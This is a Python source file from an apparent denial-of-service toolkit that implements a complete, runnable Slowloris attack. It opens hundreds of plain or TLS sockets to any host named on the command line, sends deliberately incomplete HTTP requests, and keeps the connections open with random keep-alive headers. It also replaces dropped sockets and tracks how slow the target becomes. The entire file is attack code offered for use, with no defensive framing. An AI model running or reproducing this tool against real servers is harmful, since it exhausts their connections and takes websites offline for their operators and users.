#!/usr/bin/env python3
"""
Slowloris Attack Module
Method: Layer 7 Slowloris (Connection Exhaustion)
Author: AXMods
"""

import socket
import ssl
import random
import time
import threading
import concurrent.futures
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils import get_random_user_agent, print_status, generate_random_string
from config import USER_AGENTS
from colorama import Fore, init

init(autoreset=True)

class Slowloris:
    def __init__(self, target, port=80, sockets_count=200, duration=60, use_https=False, proxy=None):
        """
        Initialize Slowloris Attack
        
        Args:
            target (str): Target hostname or IP
            port (int): Target port
            sockets_count (int): Number of sockets to create
            duration (int): Attack duration in seconds
            use_https (bool): Use SSL/TLS for connection
            proxy (dict): Not used for socket-based attacks (kept for consistency)
        """
        self.target = target.replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]
        self.port = port
        self.sockets_count = sockets_count
        self.duration = duration
        self.use_https = use_https
        self.is_attacking = False
        
        # Socket management
        self.sockets = []
        self.socket_lock = threading.Lock()
        
        # Statistics
        self.active_sockets = 0
        self.total_sockets_created = 0
        self.sockets_recreated = 0
        self.start_time = None
        
        # Attack configuration
        self.keepalive_interval = random.randint(10, 30)  # Send keep-alive every 10-30 seconds
        self.reconnection_interval = 5  # Try to reconnect dead sockets every 5 seconds
        self.timeout = 10  # Socket timeout in seconds
        
        # Random paths and parameters
        self.paths = ['/', '/index.html', '/home', '/main', '/default', '/api/v1', '/wp-admin', '/login']
        self.parameters = ['id', 'page', 'view', 'action', 'type', 'mode', 'category', 'search']
        
    def _create_socket(self):
        """Create and initialize a socket connection"""
        try:
            # Create TCP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            # Connect to target
            sock.connect((self.target, self.port))
            
            # Wrap with SSL if needed
            if self.use_https:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.target)
            
            # Generate random path and parameters
            path = random.choice(self.paths)
            params = '&'.join([f'{p}={random.randint(1, 9999)}' for p in random.sample(self.parameters, random.randint(1, 3))])
            
            # Send initial HTTP request headers (incomplete, no CRLFCRLF)
            headers = [
                f"GET {path}?{params} HTTP/1.1\r\n",
                f"Host: {self.target}\r\n",
                f"User-Agent: {get_random_user_agent()}\r\n",
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n",
                f"Accept-Language: en-US,en;q=0.5\r\n",
                f"Accept-Encoding: gzip, deflate\r\n",
                f"Connection: keep-alive\r\n",
                f"Keep-Alive: timeout=900\r\n",
            ]
            
            for header in headers:
                sock.send(header.encode())
            
            # Don't send final CRLF - leave connection open
            with self.socket_lock:
                self.sockets.append(sock)
                self.active_sockets += 1
                self.total_sockets_created += 1
            
            return sock
            
        except Exception as e:
            if 'sock' in locals():
                try:
                    sock.close()
                except:
                    pass
            return None
    
    def _maintain_socket(self, sock):
        """Keep socket alive by sending keep-alive headers"""
        while self.is_attacking and sock in self.sockets:
            try:
                # Send partial header to keep connection alive
                keepalive_header = f"X-{generate_random_string(5)}: {random.randint(1, 9999)}\r\n"
                sock.send(keepalive_header.encode())
                
                # Random delay between keep-alive sends
                time.sleep(random.uniform(self.keepalive_interval - 5, self.keepalive_interval + 5))
                
            except (socket.timeout, socket.error, ssl.SSLError, BrokenPipeError, ConnectionResetError):
                # Socket died, remove from list
                with self.socket_lock:
                    if sock in self.sockets:
                        self.sockets.remove(sock)
                        self.active_sockets -= 1
                try:
                    sock.close()
                except:
                    pass
                break
            except Exception:
                # Any other error, close socket
                with self.socket_lock:
                    if sock in self.sockets:
                        self.sockets.remove(sock)
                        self.active_sockets -= 1
                try:
                    sock.close()
                except:
                    pass
                break
    
    def _socket_manager(self):
        """Manage socket pool - create new sockets to replace dead ones"""
        while self.is_attacking:
            with self.socket_lock:
                current_count = len(self.sockets)
            
            # Create new sockets if we're below target count
            if current_count < self.sockets_count:
                needed = self.sockets_count - current_count
                
                for _ in range(needed):
                    if not self.is_attacking:
                        break
                    
                    sock = self._create_socket()
                    if sock:
                        # Start maintainer thread for this socket
                        thread = threading.Thread(target=self._maintain_socket, args=(sock,), daemon=True)
                        thread.start()
                        self.sockets_recreated += 1
            
            # Wait before checking again
            time.sleep(self.reconnection_interval)
    
    def _stats_monitor(self):
        """Monitor and display attack statistics"""
        self.start_time = time.time()
        
        while self.is_attacking:
            elapsed = time.time() - self.start_time
            minutes = int(elapsed // 60)
            seconds = int(elapsed % 60)
            
            with self.socket_lock:
                active = self.active_sockets
                total_created = self.total_sockets_created
                recreated = self.sockets_recreated
            
            stats = (
                f"Active Sockets: {active}/{self.sockets_count} | "
                f"Total Created: {total_created:,} | "
                f"Recreated: {recreated:,} | "
                f"Time: {minutes:02d}:{seconds:02d}"
            )
            
            print_status(stats, Fore.YELLOW)
            time.sleep(2)
    
    def _connection_tester(self):
        """Test connection quality and adjust parameters"""
        while self.is_attacking:
            # Test response time periodically
            test_start = time.time()
            try:
                test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                test_socket.settimeout(5)
                test_socket.connect((self.target, self.port))
                test_socket.close()
                response_time = (time.time() - test_start) * 1000
                
                if response_time > 1000:  # If response > 1 second
                    print_status(f"Target response time: {response_time:.0f}ms (Slow)", Fore.RED)
                else:
                    print_status(f"Target response time: {response_time:.0f}ms (Normal)", Fore.GREEN)
                    
            except Exception:
                print_status("Target unreachable - connection test failed", Fore.RED)
            
            time.sleep(15)  # Test every 15 seconds
    
    def _traffic_monitor(self):
        """Estimate traffic consumption"""
        while self.is_attacking:
            time.sleep(30)  # Update every 30 seconds
            
            with self.socket_lock:
                active = self.active_sockets
            
            # Estimate: each socket sends ~100 bytes every keepalive_interval
            bytes_per_socket = 100
            interval = self.keepalive_interval
            bytes_per_second = (active * bytes_per_socket) / interval if interval > 0 else 0
            kbps = (bytes_per_second * 8) / 1024  # Convert to kbps
            
            print_status(f"Estimated Bandwidth: {kbps:.2f} Kbps | Sockets: {active}", Fore.CYAN)
    
    def start(self):
        """Start Slowloris attack"""
        print_status(f"Starting SLOWLORIS attack...", Fore.RED)
        print_status(f"Target: {self.target}:{self.port}", Fore.WHITE)
        print_status(f"Sockets: {self.sockets_count}", Fore.WHITE)
        print_status(f"Duration: {self.duration} seconds", Fore.WHITE)
        print_status(f"HTTPS: {self.use_https}", Fore.WHITE)
        print_status("-" * 50, Fore.WHITE)
        
        self.is_attacking = True
        
        # Create initial socket pool
        print_status(f"Creating initial socket pool ({self.sockets_count} sockets)...", Fore.CYAN)
        
        initial_sockets = []
        for i in range(min(self.sockets_count, 50)):  # Create 50 initially, then let manager handle rest
            if not self.is_attacking:
                break
            
            sock = self._create_socket()
            if sock:
                initial_sockets.append(sock)
            
            # Small delay to avoid overwhelming local system
            if i % 10 == 0:
                time.sleep(0.1)
        
        print_status(f"Created {len(initial_sockets)} initial sockets", Fore.GREEN)
        
        # Start maintainer threads for initial sockets
        for sock in initial_sockets:
            thread = threading.Thread(target=self._maintain_socket, args=(sock,), daemon=True)
            thread.start()
        
        # Start management threads
        manager_thread = threading.Thread(target=self._socket_manager, daemon=True)
        stats_thread = threading.Thread(target=self._stats_monitor, daemon=True)
        traffic_thread = threading.Thread(target=self._traffic_monitor, daemon=True)
        test_thread = threading.Thread(target=self._connection_tester, daemon=True)
        
        manager_thread.start()
        stats_thread.start()
        traffic_thread.start()
        test_thread.start()
        
        # Run for specified duration
        try:
            for i in range(self.duration, 0, -1):
                if not self.is_attacking:
                    break
                
                if i % 10 == 0:
                    with self.socket_lock:
                        active = self.active_sockets
                    print_status(f"Time remaining: {i}s | Active sockets: {active}", Fore.MAGENTA)
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print_status("Attack interrupted by user", Fore.YELLOW)
        
        # Stop attack
        self.is_attacking = False
        
        # Wait a moment for threads to notice
        time.sleep(2)
        
        # Close all sockets
        print_status("Closing all sockets...", Fore.CYAN)
        with self.socket_lock:
            for sock in self.sockets:
                try:
                    sock.close()
                except:
                    pass
            self.sockets.clear()
            self.active_sockets = 0
        
        # Final statistics
        elapsed = time.time() - self.start_time
        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        seconds = int(elapsed % 60)
        
        print_status("-" * 50, Fore.WHITE)
        print_status("SLOWLORIS ATTACK COMPLETED", Fore.RED)
        print_status(f"Total Sockets Created: {self.total_sockets_created:,}", Fore.GREEN)
        print_status(f"Max Active Sockets: {self.sockets_count}", Fore.YELLOW)
        print_status(f"Sockets Recreated: {self.sockets_recreated:,}", Fore.CYAN)
        print_status(f"Total Duration: {hours:02d}:{minutes:02d}:{seconds:02d}", Fore.WHITE)
        
        return {
            'total_sockets_created': self.total_sockets_created,
            'sockets_recreated': self.sockets_recreated,
            'duration': elapsed,
            'target': f"{self.target}:{self.port}",
            'method': 'slowloris'
        }

# Standalone test function
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Slowloris Attack Module")
    parser.add_argument("target", help="Target hostname or IP")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("-s", "--sockets", type=int, default=150, help="Number of sockets")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Attack duration in seconds")
    parser.add_argument("--https", action="store_true", help="Use HTTPS")
    
    args = parser.parse_args()
    
    print(f"[*] Starting Slowloris test against {args.target}:{args.port}")
    print(f"[*] Sockets: {args.sockets}")
    print(f"[*] Duration: {args.duration}s")
    print(f"[*] HTTPS: {args.https}")
    print("-" * 50)
    
    attack = Slowloris(
        target=args.target,
        port=args.port,
        sockets_count=args.sockets,
        duration=args.duration,
        use_https=args.https
    )
    
    try:
        results = attack.start()
        print(f"\n[+] Attack completed successfully!")
        print(f"Results: {results}")
    except KeyboardInterrupt:
        print(f"\n[!] Attack interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
